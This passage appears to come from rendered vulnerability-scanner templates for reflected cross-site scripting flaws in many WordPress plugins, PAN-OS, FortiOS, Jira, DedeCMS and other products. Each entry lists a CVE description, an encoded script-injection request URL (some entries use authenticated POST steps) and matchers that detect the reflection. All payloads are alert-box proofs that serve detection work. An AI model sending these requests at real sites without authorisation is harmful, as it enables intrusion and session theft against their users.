- {{BaseURL}}/login/?uid=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
- {{BaseURL}}/?uid=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. value="">\<script>alert(document.domain)\</script>

**Type - word**
- words
    1. text/html
- part - header

**Type - status**
- status
    1. 200

---
# Jeesns 1.4.2 - Cross-Site Scripting
## Description
- Jeesns 1.4.2 is vulnerable to reflected cross-site scripting that allows attackers to execute arbitrary web scripts or HTML via a crafted payload in the system error message's text field.
- severity - medium
- tags - cve,cve2020,jeesns,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/error?msg=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/html

---
# Palo Alto Networks PAN-OS Web Interface - Cross Site-Scripting
## Description
- PAN-OS management web interface is vulnerable to reflected cross-site scripting. A remote attacker able to convince an administrator with an active authenticated session on the firewall management interface to click on a crafted link to that management web interface could potentially execute arbitrary JavaScript code in the administrator's browser and perform administrative actions. This issue impacts: PAN-OS 8.1 versions earlier than PAN-OS 8.1.16; PAN-OS 9.0 versions earlier than PAN-OS 9.0.9.

- severity - high
- tags - cve,cve2020,vpn,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
- {{BaseURL}}/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. \<svg/onload=alert(1)>
- part - body

**Type - word**
- words
    1. text/html
- part - header

---
# Wordpress EventON Calendar 3.0.5 - Cross-Site Scripting
## Description
- Wordpress EventON Calendar 3.0.5 is vulnerable to cross-site scripting because it allows addons/?q= XSS via the search field.
- severity - medium
- tags - cve,cve2020,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/addons/?q=%3Csvg%2Fonload%3Dalert(1)%3E
### Matchers

**Type - word**
- words
    1. \<svg/onload=alert(1)>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# IceWarp WebMail Server \<=11.4.4.1 - Cross-Site Scripting
## Description
- IceWarp Webmail Server through 11.4.4.1 contains a cross-site scripting vulnerability in the /webmail/ color parameter.
- severity - medium
- tags - edb,packetstorm,cve,cve2020,xss,icewarp
## Requests
- Method - GET
### URL
- {{BaseURL}}/webmail/?color=%22%3E%3Csvg/onload=alert(document.domain)%3E%22
### Matchers

**Type - word**
- words
    1. \<svg/onload=alert(document.domain)>
- part - body

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. text/html
- part - header

---
# Cute Editor for ASP.NET 6.4 - Cross Site Scripting
## Description
- Cute Editor for ASP.NET 6.4 is vulnerable to reflected cross-site scripting (XSS) caused by improper validation of user supplied input. A remote attacker could exploit this vulnerability using a specially crafted URL to execute a script in a victim's Web browser within the security context of the hosting Web site, once the URL is clicked. An attacker could use this vulnerability to steal the victim's cookie-based authentication credentials.

- severity - medium
- tags - cve,cve2020,cuteeditor,xss,seclists
## Requests
- Method - GET
### URL
- {{BaseURL}}/CuteSoft_Client/CuteEditor/Template.aspx?Referrer=XSS";>\<script>alert(document.domain)\</script>
### Matchers

**Type - word**
- part - body
- words
    1. \<script>alert(document.domain)\</script>\</p>
    2. System.Web
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Tidio Gallery \<=1.1 - Cross-Site Scripting
## Description
- WordPress plugin tidio-gallery v1.1 contains a reflected cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - cve,cve2016,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/tidio-gallery/popup-insert-help.php?galleryId=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Simpel Reserveren \<=3.5.2 - Cross-Site Scripting
## Description
- WordPress plugin Simpel Reserveren 3.5.2 and before contains a reflected cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - cve,cve2016,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/simpel-reserveren/edit.php?page=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress defa-online-image-protector \<=3.3 - Cross-Site Scripting
## Description
- WordPress defa-online-image-protector 3.3 and before contains a reflected cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - cve,cve2016,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/defa-online-image-protector/redirect.php?r=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress HDW Video Gallery \<=1.2 - Cross-Site Scripting
## Description
- WordPress HDW Video Gallery 1.2 and before contains a cross-site scripting vulnerability via playlist.php which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - cve,cve2016,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/hdw-tube/playlist.php?playlist=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress e-search \<=1.0 - Cross-Site Scripting
## Description
- WordPress e-search 1.0 and before contains a reflected cross-site scripting vulnerability via title_az.php which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - cve,cve2016,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/e-search/tmpl/title_az.php?title_az=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# SPIP \<3.1.2 - Cross-Site Scripting
## Description
- SPIP 3.1.2 and earlier contains a cross-site scripting vulnerability in valider_xml.php which allows remote attackers to inject arbitrary web script or HTML via the var_url parameter in a valider_xml action.

- severity - medium
- tags - cve,cve2016,xss,spip
## Requests
- Method - GET
### URL
- {{BaseURL}}/ecrire/?exec=valider_xml&var_url=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. ">\</script>\<script>alert(document.domain)\</script>
- part - body

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/html

---
# WordPress HDW Video Gallery \<=1.2 - Cross-Site Scripting
## Description
- WordPress HDW Video Gallery 1.2 and before contains a cross-site scripting vulnerability via mychannel.php which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - cve,cve2016,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/hdw-tube/mychannel.php?channel=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress e-search \<=1.0 - Cross-Site Scripting
## Description
- Wordpress plugin e-search 1.0 and before contains a cross-site scripting vulnerability via date_select.php which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - cve,cve2016,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/e-search/tmpl/date_select.php?date-from=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress AJAX Random Post \<=2.00 - Cross-Site Scripting
## Description
- WordPress AJAX Random Post 2.00 is vulnerable to reflected cross-site scripting.
- severity - medium
- tags - cve,cve2016,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/ajax-random-post/js.php?interval=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Admin Font Editor \<=1.8 - Cross-Site Scripting
## Description
- WordPress Admin Font Editor plugin indexisto 1.8 and before contains a cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - cve,cve2016,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/indexisto/assets/js/indexisto-inject.php?indexisto_index=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress WPSOLR \<=8.6 - Cross-Site Scripting
## Description
- WordPress WPSOLR 8.6 and before contains a reflected cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - cve,cve2016,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/wpsolr-search-engine/classes/extensions/managed-solr-servers/templates/template-my-accounts.php?page=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress New Year Firework \<=1.1.9 - Cross-Site Scripting
## Description
- WordPress New Year Firework 1.1.9 and before contains a reflected cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - cve,cve2016,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/new-year-firework/firework/index.php?text=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Photoxhibit 2.1.8 - Cross-Site Scripting
## Description
- WordPress Photoxhibit 2.1.8 contains a reflected cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - cve,cve2016,wordpress,wp-plugin,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/photoxhibit/common/inc/pages/build.php?gid=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Aruba Airwave \<8.2.3.1 - Cross-Site Scripting
## Description
- Aruba Airwave before version 8.2.3.1 is vulnerable to reflected cross-site scripting.
- severity - medium
- tags - cve2016,aruba,xss,edb,cve
## Requests
- Method - GET
### URL
- {{BaseURL}}/visualrf/group_list.xml?aps=1&start=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&end=500&match
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/html

---
# WordPress Hero Maps Pro 2.1.0 - Cross-Site Scripting
## Description
- WordPress Hero Maps Pro 2.1.0 contains a reflected cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - cve,cve2016,wordpress,xss,wp-plugin,maps
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/hero-maps-pro/views/dashboard/index.php?v=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Pondol Form to Mail \<=1.1 - Cross-Site Scripting
## Description
- WordPress Pondol Form to Mail 1.1 and before contains a reflected cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - cve,cve2016,wordpress,xss,wp-plugin,mail
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/pondol-formmail/pages/admin-mail-info.php?itemid=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress heat-trackr 1.0 - Cross-Site Scripting
## Description
- WordPress heat-trackr 1.0 contains a cross-site scripting vulnerability via heat-trackr_abtest_add.php which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - cve,cve2016,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/heat-trackr/heat-trackr_abtest_add.php?id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress S3 Video \<=0.983 - Cross-Site Scripting
## Description
- WordPress S3 Video and before contains a reflected cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - cve,cve2016,wordpress,wp-plugin,xss,wpscan
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/s3-video/views/video-management/preview_video.php?media=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3C%22
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>\<"
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress WHIZZ \<=1.0.7 - Cross-Site Scripting
## Description
- WordPress plugin WHIZZ 1.07 and before contains a reflected cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - cve,cve2016,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/whizz/plugins/delete-plugin.php?plugin=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress forget-about-shortcode-buttons 1.1.1 - Cross-Site Scripting
## Description
- Wordpress plugin forget-about-shortcode-buttons 1.1.1 contains a reflected cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - cve,cve2016,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/forget-about-shortcode-buttons/assets/js/fasc-buttons/popup.php?source=1&ver=1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Admin Font Editor \<=1.8 - Cross-Site Scripting
## Description
- WordPress Admin Font Editor 1.8 and before contains a reflected cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - cve,cve2016,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/admin-font-editor/css.php?size=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress anti-plagiarism \<=3.60 - Cross-Site Scripting
## Description
- WordPress anti-plagiarism 3.6.0 and prior are vulnerable to reflected cross-site scripting.
- severity - medium
- tags - cve,cve2016,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/anti-plagiarism/js.php?m=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# ScoreMe Theme - Cross-Site Scripting
## Description
- WordPress ScoreMe theme through 2016-04-01 contains a reflected cross-site scripting vulnerability via the s parameter which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - cve,cve2016,wordpress,wp-theme,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/?s=%22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Infusionsoft Gravity Forms \<=1.5.11 - Cross-Site Scripting
## Description
- WordPress plugin Infusionsoft 1.5.11 and before contains a reflected cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - cve,cve2016,wordpress,wp-plugin,xss,wpscan
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/infusionsoft/Infusionsoft/examples/leadscoring.php?ContactId=%22%3E%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E%3C%22
### Matchers

**Type - word**
- words
    1. ">\<script>alert(document.domain);\</script>\<"
    2. input type="text" name="ContactId"
- condition - and
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Tidio-form \<=1.0 - Cross-Site Scripting
## Description
- WordPress tidio-form1.0 contains a reflected cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - cve,cve2016,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/tidio-form/popup-insert-help.php?formId=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress enhanced-tooltipglossary 3.2.8 - Cross-Site Scripting
## Description
- WordPress enhanced-tooltipglossary 3.2.8 contains a reflected cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - cve,cve2016,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/enhanced-tooltipglossary/backend/views/admin_importexport.php?itemsnumber=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&msg=imported
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Page Layout builder v1.9.3 - Cross-Site Scripting
## Description
- WordPress plugin Page-layout-builder v1.9.3 contains a cross-site scripting vulnerability.
- severity - medium
- tags - cve,cve2016,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/page-layout-builder/includes/layout-settings.php?layout_settings_id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress MW Font Changer \<=4.2.5 - Cross-Site Scripting
## Description
- WordPress MW Font Changer plugin 4.2.5 and before contains a cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - cve2016,wordpress,wp-plugin,xss,wpscan,cve
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/parsi-font/css.php?size=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# DomainMOD \<=4.11.01 - Cross-Site Scripting
## Description
- DomainMOD through version 4.11.01 is vulnerable to cross-site scripting via the assets/edit/host.php Web Host Name or Web Host URL field.

- severity - medium
- tags - domainmod,xss,authenticated,edb,cve,cve2018
## Requests
### Step - 1
```
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

new_username={{username}}&new_password={{password}}

```
### Step - 2
```
POST /assets/add/host.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

new_host=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&new_url=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&new_notes=test

```
### Step - 3
```
GET /assets/hosting.php HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. status_code_3 == 200
    2. contains(all_headers_3, "text/html")
    3. contains(body_3, ">\<script>alert(document.domain)\</script>\</a>")
- condition - and

---
# WordPress Ninja Forms \<3.3.18 - Cross-Site Scripting
## Description
- WordPress Ninja Forms plugin before 3.3.18 contains a cross-site scripting vulnerability. An attacker can inject arbitrary script in includes/Admin/Menus/Submissions.php via the begin_date, end_date, or form_id parameters. This can allow an attacker to steal cookie-based authentication credentials and launch other attacks.

- severity - medium
- tags - wp-plugin,wp,xss,authenticated,wpscan,edb,cve,cve2018,ninja-forms,wordpress
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

```
### Step - 2
```
GET /wp-admin/edit.php?s&post_status=all&post_type=nf_sub&action=-1&form_id=1&nf_form_filter&begin_date="><img+src%3Dx+onerror%3Dalert%28document.domain%29%3B%2F%2F&end_date&filter_action=Filter&paged=1&action2=-1 HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body_2
- words
    1. Begin Date" value="\">\<img src=x onerror=alert(document.domain);//">

**Type - word**
- part - header_2
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Zoho manageengine - Cross-Site Scripting
## Description
- Zoho manageengine is vulnerable to reflected cross-site scripting. This impacts  Zoho ManageEngine Netflow Analyzer before build 123137, Network Configuration Manager before build 123128, OpManager before build 123148, OpUtils before build 123161, and Firewall Analyzer before build 123147 via the parameter 'operation' to /servlet/com.adventnet.me.opmanager.servlet.FailOverHelperServlet.
- severity - medium
- tags - cve,cve2018,zoho,xss,manageengine,packetstorm
## Requests
- Method - GET
### URL
- {{BaseURL}}/servlet/com.adventnet.me.opmanager.servlet.FailOverHelperServlet?operation=11111111%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/html

---
# Fortinet FortiOS - Cross-Site Scripting
## Description
- Fortinet FortiOS 6.0.0 to 6.0.4, 5.6.0 to 5.6.7, 5.4.0 to 5.4.12, 5.2 and below versions under SSL VPN web portal are vulnerable to cross-site scripting and allows attacker to execute unauthorized malicious script code via the error or message handling parameters.
- severity - medium
- tags - cve,cve2018,fortios,xss,fortinet
## Requests
- Method - GET
### URL
- {{BaseURL}}/message?title=x&msg=%26%23%3Csvg/onload=alert(1337)%3E%3B
- {{BaseURL}}/remote/error?errmsg=ABABAB--%3E%3Cscript%3Ealert(1337)%3C/script%3E
### Matchers

**Type - word**
- part - body
- words
    1. \<svg/onload=alert(1337)>
    2. \<script>alert(1337)\</script>
- condition - or

**Type - word**
- part - header
- words
    1. application/json
- negative - True

**Type - status**
- status
    1. 200

---
# Atlassian Jira WallboardServlet \<7.13.1 - Cross-Site Scripting
## Description
- The WallboardServlet resource in Jira before version 7.13.1 allows remote attackers to inject arbitrary HTML or JavaScript via a cross-site scripting vulnerability in the cyclePeriod parameter.
- severity - medium
- tags - cve,cve2018,atlassian,jira,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)
### Matchers

**Type - status**
- status
    1. 200

**Type - regex**
- regex
    1. (?mi)timeout:\salert\(document\.domain\)
- part - body

---
# DedeCMS 5.7 SP2 - Cross-Site Scripting
## Description
- DedeCMS 5.7 SP2 is vulnerable to cross-site scripting via the function named GetPageList defined in the include/datalistcp.class.php file that is used to display the page numbers list at the bottom of some templates, as demonstrated by the PATH_INFO to /member/index.php, /member/pm.php, /member/content_list.php, or /plus/feedback.php.

- severity - medium
- tags - dedecms,xss,cve,cve2018
## Requests
- Method - GET
### URL
- {{BaseURL}}/plus/feedback.php/rp4hu%27>\<script>alert%28document.domain%29\<%2fscript>?aid=3
### Matchers

**Type - word**
- part - body
- words
    1. '>\<script>alert(document.domain)\</script>
    2. DedeCMS Error Warning!
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Microstrategy Web 7 - Cross-Site Scripting
## Description
- Microstrategy Web 7 does not sufficiently encode user-controlled inputs, resulting in cross-site scripting via the Login.asp Msg parameter.
- severity - medium
- tags - cve2018,microstrategy,xss,edb,packetstorm,cve
## Requests
- Method - GET
### URL
- {{BaseURL}}/microstrategy7/Login.asp?Server=Server001&Project=Project001&Port=0&Uid=Uid001&Msg=%22%3E%3Cscript%3Ealert(/{{randstr}}/)%3B%3C%2Fscript%3E%3C
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. ">\<script>alert(/{{randstr}}/);\</script>
- part - body

**Type - word**
- words
    1. text/html
- part - header

---
# Oracle Secure Global Desktop Administration Console 4.4 - Cross-Site Scripting
## Description
- Oracle Secure Global Desktop Administration Console 4.4 contains a reflected cross-site scripting vulnerability in helpwindow.jsp via all parameters, as demonstrated by the sgdadmin/faces/com_sun_web_ui/help/helpwindow.jsp windowTitle parameter.
- severity - medium
- tags - oracle,xss,seclists,packetstorm,cve,cve2018
## Requests
- Method - GET
### URL
